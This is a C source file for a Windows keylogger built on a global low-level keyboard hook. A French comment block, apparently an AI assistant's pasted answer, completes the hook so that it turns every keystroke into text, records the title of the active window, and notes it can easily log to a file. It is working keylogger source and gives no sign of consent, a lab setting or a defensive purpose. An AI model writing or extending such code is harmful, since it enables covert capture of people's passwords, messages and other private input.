#include "winkey.h"

HHOOK g_Hook = NULL;

bool    Keylogger(void)
{
    if (SetupKeyHook() == false)
        return false;

    MSG     msg;

    while (GetMessage(&msg, NULL, 0, 0))        // Wait for event
    {
        TranslateMessage(&msg);                 // Translate event of virtual key to character
        DispatchMessage(&msg);                  // Send message to window, maybe not useful for us
    }
    

    RemoveKeyHook();

    return true;
}

LRESULT CALLBACK    KeyboardProc(int code, WPARAM wParam, LPARAM lParam)
/*
    nCode  -> A code the hook procedure uses to determine how to process the message.
    wParam -> The virtual-key code of the key that generated the keystroke message
    lParam -> Pointer to a struct KBDLLHOOKSTRUCT
*/
{

    printf("Key was pressed\n");
    return CallNextHookEx(g_Hook, code, wParam, lParam);
}

bool    SetupKeyHook(void)
{
    g_Hook = SetWindowsHookEx( WH_KEYBOARD_LL,         // Type of procedure
                               KeyboardProc,           // Callback function
                               GetModuleHandle(NULL),  // Used if callback function is in a .dll
                               0);                     // 0 Associate the callback to every thread
    if (g_Hook == NULL)
    {
        return false;
    }

    return true;
}

void    RemoveKeyHook(void)
{
    if (g_Hook != NULL)
    {
        UnhookWindowsHookEx(g_Hook);
        g_Hook = NULL;
    }
}


// typedef struct tagMSG 
// {
//     HWND   hwnd;
//     UINT   message;
//     WPARAM wParam;
//     LPARAM lParam;
//     DWORD  time;
//     POINT  pt;
//     DWORD  lPrivate;
//
// }   MSG;



// # Compléter la fonction KeyboardProc pour afficher les touches

// Voici comment vous pouvez compléter la fonction KeyboardProc pour capturer et afficher les touches pressées dans le terminal :

// ```c
// LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam)
// {
//     if (code >= 0)  // Si le code est négatif, on doit passer le message sans traitement
//     {
//         // On ne traite que les appuis de touches (pas les relâchements)
//         if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
//         {
//             KBDLLHOOKSTRUCT* kbStruct = (KBDLLHOOKSTRUCT*)lParam;
//             DWORD vkCode = kbStruct->vkCode;
            
//             // Buffer pour stocker le caractère traduit
//             WCHAR buffer[8] = {0};
            
//             // Récupérer l'état du clavier
//             BYTE keyboardState[256] = {0};
//             GetKeyboardState(keyboardState);
            
//             // Convertir le code de touche virtuelle en caractère
//             int result = ToUnicodeEx(
//                 vkCode,
//                 kbStruct->scanCode,
//                 keyboardState,
//                 buffer,
//                 8,
//                 0,
//                 GetKeyboardLayout(0)
//             );
            
//             // Si la touche a été traduite avec succès
//             if (result > 0)
//             {
//                 printf("Touche: %ls\n", buffer);
//             }
//             // Gestion des touches spéciales non traduisibles en caractères
//             else
//             {
//                 char* specialKey = NULL;
                
//                 switch (vkCode)
//                 {
//                     case VK_RETURN:    specialKey = "ENTER"; break;
//                     case VK_BACK:      specialKey = "BACKSPACE"; break;
//                     case VK_SPACE:     specialKey = "SPACE"; break;
//                     case VK_TAB:       specialKey = "TAB"; break;
//                     case VK_ESCAPE:    specialKey = "ESCAPE"; break;
//                     case VK_SHIFT:     specialKey = "SHIFT"; break;
//                     case VK_CONTROL:   specialKey = "CTRL"; break;
//                     case VK_MENU:      specialKey = "ALT"; break;
//                     case VK_DELETE:    specialKey = "DELETE"; break;
//                     case VK_LEFT:      specialKey = "LEFT"; break;
//                     case VK_RIGHT:     specialKey = "RIGHT"; break;
//                     case VK_UP:        specialKey = "UP"; break;
//                     case VK_DOWN:      specialKey = "DOWN"; break;
//                     case VK_F1:        specialKey = "F1"; break;
//                     // Vous pouvez ajouter plus de touches spéciales ici
//                     default:
//                         specialKey = "UNKNOWN";
//                 }
                
//                 printf("Touche spéciale: [%s]\n", specialKey);
//             }
            
//             // Afficher le nom de la fenêtre active
//             HWND foregroundWindow = GetForegroundWindow();
//             if (foregroundWindow)
//             {
//                 char windowTitle[256] = {0};
//                 GetWindowTextA(foregroundWindow, windowTitle, 256);
//                 printf("Fenêtre active: %s\n", windowTitle);
//                 printf("---------------------------\n");
//             }
            
//             // Pour sortir proprement (par exemple avec ESCAPE)
//             if (vkCode == VK_ESCAPE)
//             {
//                 printf("Sortie du programme demandée (touche ESCAPE)\n");
//                 PostQuitMessage(0);  // Cette ligne fait sortir de la boucle GetMessage
//             }
//         }
//     }
    
//     // Toujours passer le message au hook suivant
//     return CallNextHookEx(g_Hook, code, wParam, lParam);
// }
// ```

// ## Explications détaillées

// 1. **Vérification du code**
//    - `if (code >= 0)` : Ne traite que les codes valides

// 2. **Filtrage des événements clavier**
//    - `if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)` : Ne traite que les touches pressées, pas les relâchements

// 3. **Extraction des informations**
//    - `KBDLLHOOKSTRUCT* kbStruct = (KBDLLHOOKSTRUCT*)lParam` : Récupère les données de la touche
//    - `vkCode` contient le code de touche virtuelle

// 4. **Traduction du code virtuel en caractère**
//    - `WCHAR buffer[8]` : Buffer pour stocker les caractères résultants
//    - `GetKeyboardState()` : Récupère l'état actuel du clavier (touches modificatrices, etc.)
//    - `ToUnicodeEx()` : Convertit le code virtuel en caractères Unicode en tenant compte de la disposition du clavier

// 5. **Affichage du caractère ou de la touche spéciale**
//    - Si `ToUnicodeEx()` réussit : Affiche le caractère
//    - Sinon : Identifie et affiche le nom de la touche spéciale

// 6. **Affichage du contexte (fenêtre active)**
//    - `GetForegroundWindow()` : Obtient la fenêtre active
//    - `GetWindowTextA()` : Obtient le titre de cette fenêtre

// 7. **Mécanisme de sortie**
//    - Si Escape est pressé : Appelle `PostQuitMessage(0)` pour sortir de la boucle GetMessage

// Cette implémentation répond à votre besoin tout en offrant:
// - Un affichage propre dans le terminal
// - Une gestion des caractères et des touches spéciales
// - Le contexte de la fenêtre active
// - Une méthode pour quitter proprement le programme

// Vous pourrez facilement adapter ce code pour écrire dans un fichier log plutôt que sur le terminal.